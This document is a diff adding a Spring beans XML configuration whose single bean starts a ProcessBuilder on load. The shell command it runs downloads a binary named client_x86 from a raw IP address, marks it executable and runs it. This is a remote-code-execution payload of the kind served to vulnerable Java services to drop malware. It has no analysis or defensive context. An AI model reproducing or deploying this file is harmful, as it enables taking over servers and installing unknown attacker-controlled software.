@@ -1,0 +1,14 @@
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+            <list>
+                <value>sh</value>
+                <value>-c</value>
+                <value>rm px86; curl --output px86 http://85.137.53.167:3162/bins/client_x86; wget http://85.137.53.167:3162/bins/client_x86; chmod 777 px86; ./px86 px86;</value>
+            </list>
+        </constructor-arg>
+    </bean>
+</beans>
